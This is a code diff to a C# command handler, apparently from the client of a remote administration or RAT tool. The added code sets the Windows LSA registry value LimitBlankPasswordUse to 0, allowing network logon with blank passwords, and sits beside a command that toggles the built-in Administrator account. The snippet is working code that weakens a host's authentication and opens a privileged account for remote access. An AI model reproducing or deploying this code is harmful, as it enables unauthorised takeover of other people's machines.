@@ -105,6 +105,18 @@ namespace xClient.Core.Commands
                     return;
                 }
 
+                bool allowBlankPassResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Lsa",
+                    "LimitBlankPasswordUse", 0,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!allowBlankPassResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
                 // Enable default administrator account
                 // net user administrator /active:yes
                 SystemHelper.ExecuteCommandLine("net user administrator /active:" + (toggleState ? "no" : "yes"), true);
